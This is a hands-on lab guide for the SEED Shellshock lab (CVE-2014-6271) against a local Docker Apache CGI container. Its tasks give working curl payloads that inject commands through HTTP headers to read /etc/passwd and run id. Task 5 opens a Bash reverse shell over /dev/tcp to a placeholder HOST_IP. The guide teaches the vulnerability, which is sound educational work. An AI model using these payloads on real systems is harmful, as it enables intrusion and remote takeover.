# Lab 05 — Shellshock Vulnerability Lab

Official lab manual: https://seedsecuritylabs.org/Labs_20.04/Web/Shellshock/
Textbook: Chapter 3 — Shellshock Attack (*Computer & Internet Security*, Prof. Wenliang Du)
CVE Reference: CVE-2014-6271, CVE-2014-7169

For authorized educational use only.

---

## Security Concept

Shellshock is a critical vulnerability in the Bash shell (versions through 4.3) discovered in 2014. Bash allows functions to be stored in environment variables. The bug is that Bash also executes any code appended after the function definition.

```
Normal function in environment variable:
  VAR='() { echo hello; }'

Shellshock payload:
  VAR='() { :; }; echo INJECTED'
           ^^^^^   ^^^^^^^^^^^^^^
           empty   this code runs too
           func    IMMEDIATELY when bash starts
```

When Apache runs a CGI script using Bash, it converts HTTP request headers (User-Agent, Referer, Cookie) into environment variables. An attacker who controls the User-Agent header can inject the Shellshock payload and execute arbitrary commands on the server.

```
Attacker sends:
  User-Agent: () { :; }; /bin/cat /etc/passwd

Apache sets:
  HTTP_USER_AGENT='() { :; }; /bin/cat /etc/passwd'

CGI script runs under vulnerable bash:
  Bash processes the env var -> executes /bin/cat /etc/passwd
  Output sent back to attacker in HTTP response
```

This lab uses:
- `vul.cgi` — runs under `bash_shellshock` (a copy of vulnerable Bash 4.3)
- `safe.cgi` — runs under `/bin/bash` (patched Bash, not vulnerable)

---

## Container Architecture

```
HOST MACHINE
  |
  | Port 10086 -> shellshock-10.9.0.80:80
  |
  Docker Bridge Network: net-10.9.0.0-shellshock (10.9.0.0/24)
    |
    +---- shellshock-10.9.0.80   (Apache + CGI module + vulnerable bash copy)
              |
              /cgi-bin/vul.cgi   (uses /bin/bash_shellshock  <- vulnerable)
              /cgi-bin/safe.cgi  (uses /bin/bash             <- patched)
```

---

## Layer 1 — Docker Commands (host terminal)

### Start the Lab

```bash
cd labs/05-shellshock
docker compose up -d --build

# image_www/Dockerfile:
# - Extends handsonsecurity/seed-server:apache-php
# - Copies system bash to /bin/bash_shellshock (simulates vulnerable bash)
# - Copies vul.cgi and safe.cgi to /usr/lib/cgi-bin/
# - Makes CGI scripts executable
```

```powershell
# Windows
cd labs\05-shellshock
docker compose up -d --build
```

### Verify Container

```bash
docker compose ps

# NAME                    IMAGE                     STATUS    PORTS
# shellshock-10.9.0.80    seed-image-www-shellshock  Up        0.0.0.0:10086->80/tcp
```

### Test CGI Endpoints from Host

```bash
# Test that both endpoints respond (no injection yet)
curl http://localhost:10086/cgi-bin/vul.cgi
curl http://localhost:10086/cgi-bin/safe.cgi
```

```powershell
# Windows
curl.exe http://localhost:10086/cgi-bin/vul.cgi
curl.exe http://localhost:10086/cgi-bin/safe.cgi
```

### Watch Logs

```bash
# Stream Apache logs while performing exploit tests
docker compose logs -f www
```

---

## Layer 2 — Linux Commands (inside the container)

### Open Bash Shell Inside the Container

```bash
docker exec -it shellshock-10.9.0.80 bash
```

Prompt changes:
```
Before: PS C:\>  OR  user@host:~$
After:  root@shellshock-10.9.0.80:/#
```

### Inspect Bash Binaries

```bash
whoami && hostname
# root | shellshock-10.9.0.80

# List both bash binaries
ls -la /bin/bash*
# /bin/bash           <- system bash (modern, patched)
# /bin/bash_shellshock <- copy of bash used by vul.cgi (simulates vulnerable version)

# Check bash version
/bin/bash --version
/bin/bash_shellshock --version

# Check if Shellshock is present in bash_shellshock
# (This tests the vulnerability directly without HTTP)
env x='() { :; }; echo SHELLSHOCK_VULNERABLE' /bin/bash_shellshock -c "echo test"
# If "SHELLSHOCK_VULNERABLE" prints, the binary is vulnerable

env x='() { :; }; echo SHELLSHOCK_VULNERABLE' /bin/bash -c "echo test"
# Should only print "test" (patched bash ignores the injected code)
```

### Inspect CGI Scripts

```bash
ls -la /usr/lib/cgi-bin/
# vul.cgi  (executable)
# safe.cgi (executable)

cat /usr/lib/cgi-bin/vul.cgi
# #!/bin/bash_shellshock  <- shebang points to vulnerable bash

cat /usr/lib/cgi-bin/safe.cgi
# #!/bin/bash  <- shebang points to patched bash
```

### Inspect Apache CGI Configuration

```bash
# Check CGI module is enabled
apache2ctl -M | grep cgi
# Should show: cgi_module (shared)

# Check CGI directory configuration
cat /etc/apache2/sites-enabled/000-default.conf | grep -A5 cgi-bin

# View running processes
ps aux
# apache2 processes should be running
```

### View Real-Time Apache Logs

```bash
tail -f /var/log/apache2/access.log
# Watch HTTP requests and response codes during exploit tests
# Ctrl+C to stop
```

### Exit Container

```bash
exit
```

Prompt returns:
```
Before: root@shellshock-10.9.0.80:/#
After:  PS C:\>  OR  user@host:~$
```

---

## Layer 3 — Security Tasks

### Task 1 — Confirm the Vulnerability Exists

```bash
# Linux/macOS/WSL2
curl -A "() { :; }; echo; echo Content-Type: text/plain; echo; echo SHELLSHOCK_WORKS" \
  http://localhost:10086/cgi-bin/vul.cgi
```

```powershell
# Windows PowerShell (use curl.exe not curl)
curl.exe -A "() { :; }; echo; echo Content-Type: text/plain; echo; echo SHELLSHOCK_WORKS" `
  http://localhost:10086/cgi-bin/vul.cgi
```

If the response body contains `SHELLSHOCK_WORKS`, the vulnerability is confirmed.

### Task 2 — Read Server Files (Remote Code Execution)

```bash
# Read /etc/passwd from the server
curl -A "() { :; }; echo; /bin/cat /etc/passwd" \
  http://localhost:10086/cgi-bin/vul.cgi
```

```powershell
# Windows
curl.exe -A "() { :; }; echo; /bin/cat /etc/passwd" `
  http://localhost:10086/cgi-bin/vul.cgi
```

You should receive the container's `/etc/passwd` file content in the HTTP response body.

### Task 3 — Confirm safe.cgi Is NOT Vulnerable

```bash
# Same payload against the safe endpoint — should NOT execute the injected command
curl -A "() { :; }; echo; echo SHOULD_NOT_APPEAR" \
  http://localhost:10086/cgi-bin/safe.cgi
```

```powershell
# Windows
curl.exe -A "() { :; }; echo; echo SHOULD_NOT_APPEAR" `
  http://localhost:10086/cgi-bin/safe.cgi
```

Response should not contain `SHOULD_NOT_APPEAR`. The patched bash treats the env var as data.

### Task 4 — Inject via Other HTTP Headers

```bash
# User-Agent is not the only vector — any header Apache converts to env var works
# Try the Referer header
curl -A "normal" -e "() { :; }; echo; /bin/ls /var/www/html" \
  http://localhost:10086/cgi-bin/vul.cgi

# Try a custom header
curl -H "Custom-Header: () { :; }; echo; id" \
  http://localhost:10086/cgi-bin/vul.cgi
```

```powershell
# Windows
curl.exe -A "normal" -e "() { :; }; echo; /bin/ls /var/www/html" `
  http://localhost:10086/cgi-bin/vul.cgi
```

### Task 5 — Get a Reverse Shell (Advanced)

Open two PowerShell/terminal windows:

Window 1 — start listener on port 9090:
```bash
# Linux
nc -lvp 9090
```

```powershell
# Windows (requires ncat or install from nmap package)
ncat -lvp 9090
```

Window 2 — trigger reverse shell via Shellshock:
```bash
# Linux/macOS — replace HOST_IP with your machine's IP visible from WSL2
curl -A "() { :; }; /bin/bash -i >& /dev/tcp/HOST_IP/9090 0>&1" \
  http://localhost:10086/cgi-bin/vul.cgi
```

```powershell
# Windows — find your WSL2 IP first
(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -like "vEthernet*"}).IPAddress
# Use that IP in the reverse shell payload

curl.exe -A "() { :; }; /bin/bash -i >& /dev/tcp/HOST_IP/9090 0>&1" `
  http://localhost:10086/cgi-bin/vul.cgi
```

### Verify the Attack Triggered in Logs

After each attack, check the Apache access log:
```bash
docker exec shellshock-10.9.0.80 tail -20 /var/log/apache2/access.log
```

```powershell
docker exec shellshock-10.9.0.80 tail -20 /var/log/apache2/access.log
```

---

## Stop and Reset

```bash
docker compose down
docker compose down -v && docker compose up -d --build
```

```powershell
# Windows
docker compose down -v
docker compose up -d --build
```

---

## Key File Locations

| File | Container | Path |
|------|-----------|------|
| Vulnerable CGI script | `shellshock-10.9.0.80` | `/usr/lib/cgi-bin/vul.cgi` |
| Safe CGI script | `shellshock-10.9.0.80` | `/usr/lib/cgi-bin/safe.cgi` |
| Vulnerable bash copy | `shellshock-10.9.0.80` | `/bin/bash_shellshock` |
| Patched bash | `shellshock-10.9.0.80` | `/bin/bash` |
| Apache access log | `shellshock-10.9.0.80` | `/var/log/apache2/access.log` |
| Apache error log | `shellshock-10.9.0.80` | `/var/log/apache2/error.log` |
| Apache CGI config | `shellshock-10.9.0.80` | `/etc/apache2/sites-enabled/000-default.conf` |
